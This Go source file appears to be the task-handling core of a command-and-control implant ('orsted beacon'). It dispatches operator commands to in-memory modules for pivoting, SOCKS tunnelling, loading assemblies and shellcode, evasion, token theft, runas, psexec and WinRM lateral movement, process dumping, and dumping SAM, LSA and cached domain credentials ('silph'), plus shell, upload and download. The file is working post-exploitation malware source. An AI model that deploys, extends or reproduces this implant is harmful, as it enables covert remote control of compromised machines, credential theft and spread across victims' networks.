package core

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"strconv"
	"strings"
	"unsafe"

	"orsted/beacon/modules/autoroute"
	"orsted/beacon/modules/memorymodule"
	"orsted/beacon/modules/pivot"
	"orsted/beacon/modules/socks"
	"orsted/beacon/modules/upload"
	"orsted/beacon/utils"
	"orsted/profiles"
)

// RegisterTaskInModule and return response to be return to server
// as well as potential error
func RegisterTaskInModule(modulename string, data map[string]interface{}) ([]byte, error) {
	jsonBytes, _ := json.Marshal(data)
	taskPtr := &jsonBytes[0]
	taskSize := len(jsonBytes)
	stdoutbyte, stderrbyte, err := memorymodule.ExecuteFunctionInModule(modulename, "RegisterTask", uintptr(unsafe.Pointer(taskPtr)), uintptr(unsafe.Pointer(&taskSize)))
	resp := ConstructResponse(stdoutbyte, stderrbyte, err)
	return resp, err
}

// Core Function that will hanle tasks
// Always send result to parent peer
func HandleTasks(t utils.Tasks, f utils.ResultSender) {
	for _, atask := range t.Tasks {
		resp, err := HandleTask(atask)
		if err != nil {
			f(utils.ParentPeer, atask.TaskId, "failed", "reqsenttaskres", resp)
			continue
		}

		// Workaround for interactive shell
		// Cool to have silent register task
		if resp != nil {
			f(utils.ParentPeer, atask.TaskId, "sent", "reqsenttaskres", resp)
		}

	}
	CheckInOnOldTask()
}

// Handle a single Task
func HandleTask(t utils.Task) ([]byte, error) {
	command := t.Command
	res := strings.SplitN(command, " ", 2)
	utils.Print("Received command ", command)
	switch res[0] {
	case "pivot":
		argsString := strings.Split(res[1], " ")
		switch argsString[0] {
		case "start":
			if len(argsString) != 3 {
				resp := ConstructResponse([]byte("Wrong Arg type"), []byte(""), nil)
				return resp, nil
			}
			go pivot.StartPivot(argsString[1], argsString[2])
			resp := ConstructResponse([]byte("Started Pivot Listener"), []byte(""), nil)
			return resp, nil
		case "stop":
			if len(argsString) != 2 {
				resp := ConstructResponse([]byte("Wrong Arg type"), []byte(""), nil)
				return resp, nil
			}
			err := pivot.StopPivot(argsString[1])
			if err != nil {
				resp := ConstructResponse([]byte(""), []byte(""), err)
				return resp, nil
			}
			resp := ConstructResponse([]byte("Stopped Pivot Listener"), []byte(""), nil)
			return resp, nil
		case "list":
			res := pivot.ListPivot()
			resp := ConstructResponse([]byte(res), []byte(""), nil)
			return resp, nil

		}
		resp := ConstructResponse([]byte(""), []byte("Wrong Action verb"), nil)
		return resp, nil
	case "socks":
		if res[1] == "bind" {
			ctx, cancel := context.WithCancel(context.Background())
			socks.CONNECTED_SOCKS = cancel
			go socks.StartSocksServer(ctx)
			resp := ConstructResponse([]byte("Socks Binded Successfully"), []byte(""), nil)
			return resp, nil
		}
		if res[1] == "unbind" {
			if socks.CONNECTED_SOCKS != nil {
				socks.CONNECTED_SOCKS()
			}
			SendTaskResult(utils.ParentPeer, t.TaskId, "ongoing", "respsocksunbind", nil)
			resp := ConstructResponse([]byte("Socks Unbinded Successfully"), []byte(""), nil)
			return resp, nil
		}
	case "autoroute":
		ctx, _ := context.WithCancel(context.Background())
		go autoroute.StartAutorouting(ctx)
		resp := ConstructResponse([]byte("Autoroute started"), []byte(""), nil)
		return resp, nil
	case "load-module":
		stdoutbyte, stderrbyte, err := memorymodule.LoadMemoryModule(res[1], t.Reqdata)
		resp := ConstructResponse(stdoutbyte, stderrbyte, err)
		if err != nil {
			return resp, err
		}
		return resp, nil
	case "download":
		filepath := strings.Split(res[1], " ")[0]
		data := map[string]interface{}{
			"taskid":         t.TaskId,
			"filetodownload": filepath,
		}
		resp, err := RegisterTaskInModule("download", data)
		return resp, err
	case "inline-clr":
		var argsString []string = []string{" "}
		var assemblyName string
		var taskAction string

		commandArgs, size := ParseCommandLineArgument(res[1])
		if size >= 1 {
			taskAction = commandArgs[0]
		}
		if size >= 2 {
			assemblyName = commandArgs[1]
		}
		if size >= 3 {
			argsString = commandArgs[2:]
			utils.Print("Argument Are for inline-clr ", argsString)
		}

		data := map[string]interface{}{
			"taskid":       t.TaskId,
			"taskaction":   taskAction,
			"assemblyname": assemblyName,
			"assembly":     t.Reqdata,
			"args":         argsString,
		}
		resp, err := RegisterTaskInModule("inline-clr", data)
		return resp, err
	case "evasion":
		var argsString []string = []string{" "}
		var taskAction string

		commandArgs, size := ParseCommandLineArgument(res[1])
		if size >= 1 {
			taskAction = commandArgs[0]
		}
		if size >= 2 {
			argsString = commandArgs[1:]
			utils.Print("Argument Are for ev ", argsString)
		}

		data := map[string]interface{}{
			"taskid":     t.TaskId,
			"taskaction": taskAction,
			"args":       argsString,
		}
		resp, err := RegisterTaskInModule("evasion", data)
		return resp, err
	case "execute-assembly":
		var argsString []string = []string{" "}

		commandArgs, _ := ParseCommandLineArgument(res[1])
		argsString = commandArgs

		data := map[string]interface{}{
			"taskid":    t.TaskId,
			"shellcode": t.Reqdata,
			"args":      argsString,
		}
		resp, err := RegisterTaskInModule("execute-assembly", data)
		return resp, err
	case "shell":
		var argsString []string = []string{" "}
		commandArgs, _ := ParseCommandLineArgument(res[1])
		argsString = commandArgs

		data := map[string]interface{}{
			"taskid": t.TaskId,
			"args":   argsString,
		}
		_, err := RegisterTaskInModule("shell", data)
		return nil, err
	case "sleep":
		newSleep, err := strconv.Atoi(res[1])
		if err != nil {
			return []byte("Invalid Sleep"), err
		}
		profiles.Config.Interval = int64(newSleep)
		return []byte("Sleep Change Successfully"), nil

	case "ps":
		data := map[string]interface{}{
			"taskid": t.TaskId,
		}
		resp, err := RegisterTaskInModule("ps", data)
		return resp, err

	case "token":
		var argsString []string = []string{" "}
		var taskAction string

		commandArgs, size := ParseCommandLineArgument(res[1])
		if size >= 1 {
			taskAction = commandArgs[0]
		}
		if size >= 2 {
			argsString = commandArgs[1:]
			utils.Print("Argument Are for ev ", argsString)
		}

		data := map[string]interface{}{
			"taskid":     t.TaskId,
			"taskaction": taskAction,
			"args":       argsString,
		}
		resp, err := RegisterTaskInModule("token", data)
		return resp, err
	case "runas":
		var background string
		var username string
		var password string
		var application []string

		commandArgs, size := ParseCommandLineArgument(res[1])
		if size >= 1 {
			background = commandArgs[0]
		}
		if size >= 2 {
			username = commandArgs[1]
		}
		if size >= 3 {
			password = commandArgs[2]
		}
		if size >= 3 {
			application = commandArgs[3:]
		}
		utils.Print("Argument Are for runas %s %s %s %s", background, username, password, application)

		data := map[string]interface{}{
			"taskid":      t.TaskId,
			"username":    username,
			"password":    password,
			"application": application,
			"background":  background,
		}
		resp, err := RegisterTaskInModule("runas", data)
		return resp, err
	case "run":

		command := res[1]

		data := map[string]interface{}{
			"taskid":  t.TaskId,
			"command": command,
		}
		resp, err := RegisterTaskInModule("run", data)
		return resp, err
	case "ls":

		path := res[1]

		data := map[string]interface{}{
			"taskid": t.TaskId,
			"path":   path,
		}
		resp, err := RegisterTaskInModule("ls", data)
		return resp, err
	case "procdump":
		var method string = ""
		splittedArg := strings.Split(res[1], " ")
		pid := splittedArg[0]
		if len(splittedArg) > 2 {
			method = splittedArg[2]
		}
		data := map[string]interface{}{
			"taskid": t.TaskId,
			"pid":    pid,
			"method": method,
		}
		resp, err := RegisterTaskInModule("procdump", data)
		return resp, err
	case "cat":

		path := res[1]

		data := map[string]interface{}{
			"taskid": t.TaskId,
			"path":   path,
		}
		resp, err := RegisterTaskInModule("cat", data)
		return resp, err
	case "psexec":
		var serviceName string
		var serviceDesc string
		var binPath string
		var hostname string
		var args []string

		commandArgs, size := ParseCommandLineArgument(res[1])
		if size >= 1 {
			serviceName = commandArgs[0]
		}
		if size >= 2 {
			serviceDesc = commandArgs[1]
		}
		if size >= 3 {
			binPath = commandArgs[2]
		}
		if size >= 4 {
			hostname = commandArgs[3]
		}
		if size >= 5 {
			args = commandArgs[4:]
		}

		data := map[string]interface{}{
			"taskid":      t.TaskId,
			"servicename": serviceName,
			"servicedesc": serviceDesc,
			"binpath":     binPath,
			"hostname":    hostname,
			"filedata":    t.Reqdata,
			"args":        args,
		}
		resp, err := RegisterTaskInModule("psexec", data)
		return resp, err
	case "powercliff":
		var taskAction string
		var script []byte

		commandArgs, size := ParseCommandLineArgument(res[1])
		if size >= 1 {
			taskAction = commandArgs[0]
		}

		script = t.Reqdata
		utils.Print("Argument Are for runas %s %s %s %s", taskAction, script)

		data := map[string]interface{}{
			"taskid":     t.TaskId,
			"taskaction": taskAction,
			"script":     script,
		}
		resp, err := RegisterTaskInModule("powercliff", data)
		return resp, err
	case "winrm":
		var host string
		var port string
		var insecure string
		var tls string
		var authType string
		var background string

		commandArgs, size := ParseCommandLineArgument(res[1])
		if size != 6 {
			return []byte("Error in number argument for winrm"), fmt.Errorf("Error in number of args for winrm")
		}
		host = commandArgs[0]
		port = commandArgs[1]
		insecure = commandArgs[2]
		tls = commandArgs[3]
		authType = commandArgs[4]
		background = commandArgs[5]

		data := map[string]interface{}{
			"taskid":           t.TaskId,
			"host":             host,
			"port":             port,
			"insecure":         insecure,
			"tls":              tls,
			"authType":         authType,
			"background":       background,
			"winrmPackedParam": t.Reqdata,
		}
		resp, err := RegisterTaskInModule("winrm", data)
		return resp, err
	case "silph":
		commandArgs, size := ParseCommandLineArgument(res[1])
		if size != 3 {
			return []byte("Error in number argument for silph"), fmt.Errorf("Error in number of args for silph")
		}
		sam := commandArgs[0]
		lsa := commandArgs[1]
		dcc2 := commandArgs[2]

		data := map[string]interface{}{
			"taskid":           t.TaskId,
			"sam":             sam,
			"lsa":             lsa,
			"dcc2":         dcc2,
		}
		resp, err := RegisterTaskInModule("silph", data)
		return resp, err


	case "upload":
		stdoutbyte, stderrbyte, err := upload.Upload(res[1], t.Reqdata)
		resp := ConstructResponse(stdoutbyte, stderrbyte, err)
		return resp, nil

	}
	return []byte("No Handler for Task"), errors.New("No Handler")
}

func ConstructResponse(stdoutByte []byte, stderrByte []byte, err error) []byte {
	var res []byte
	res = append(res, []byte("\nSTDOUT ---> \n")...)
	res = append(res, stdoutByte...)
	res = append(res, []byte("\nSTDERR ---> \n")...)
	res = append(res, stderrByte...)
	if err != nil {
		res = append(res, []byte(err.Error())...)
	}
	return res
}

func CheckInOnOldTask() {
	for i := 0; i < len(memorymodule.LoadedMemoryModule); i++ {
		moduleName := memorymodule.LoadedMemoryModule[i].Name
		CheckInOnOldTaskInModule(moduleName)
	}
}

func CheckInOnOldTaskInModule(modulename string) {
	// Get All Old Task Saved in Module
	res, _, err := memorymodule.ExecuteFunctionInModule(modulename, "GetTaskIdList")
	if err != nil {
		utils.Print("Error Getting GetTaskIdList ", err.Error())
	}
	var taskIdList []string
	err = json.Unmarshal(res, &taskIdList)
	if err != nil {
		utils.Print("Error unmarshelling list ", err.Error())
	}
	utils.Print("Old Tasks are ", taskIdList)

	// Get Next Chunck for each task
	for i := 0; i < len(taskIdList); i++ {

		taskId := taskIdList[i]
		taskIdByte := []byte(taskId)
		taskIdSize := len(taskId)
		// TODO CHeck error and send failed
		stdout, _, err := memorymodule.ExecuteFunctionInModule(modulename, "GetNextByteChunck", uintptr(unsafe.Pointer(&taskIdByte[0])), uintptr(unsafe.Pointer(&taskIdSize)))
		if err != nil {
			utils.Print("Error Getting GetNextByteChunck ", err.Error())
		}

		// Get Status
		stdoutStatus, _, err := memorymodule.ExecuteFunctionInModule(modulename, "GetTaskStatus", uintptr(unsafe.Pointer(&taskIdByte[0])), uintptr(unsafe.Pointer(&taskIdSize)))
		if err != nil {
			utils.Print("Error Getting GetTaskStatus ", err.Error())
		}
		status := string(stdoutStatus)
		utils.Print("Status is ", status)

		// Get Task Type
		stdoutType, _, err := memorymodule.ExecuteFunctionInModule(modulename, "GetTaskType", uintptr(unsafe.Pointer(&taskIdByte[0])), uintptr(unsafe.Pointer(&taskIdSize)))
		if err != nil {
			utils.Print("Error Getting GetTaskType", err.Error())
		}
		taskType := string(stdoutType)
		utils.Print("Type is ", taskType)

		// Send Result
		// fmt.Println("Sending ---> ", stdout)
		SendTaskResult(utils.ParentPeer, taskId, status, taskType, stdout)

		// Clean DOne Task
		memorymodule.ExecuteFunctionInModule(modulename, "CleanDoneTask")
	}
}

func ParseCommandLineArgument(command string) (res []string, size int) {
	res = strings.Split(command, " ")
	return res, len(res)
}
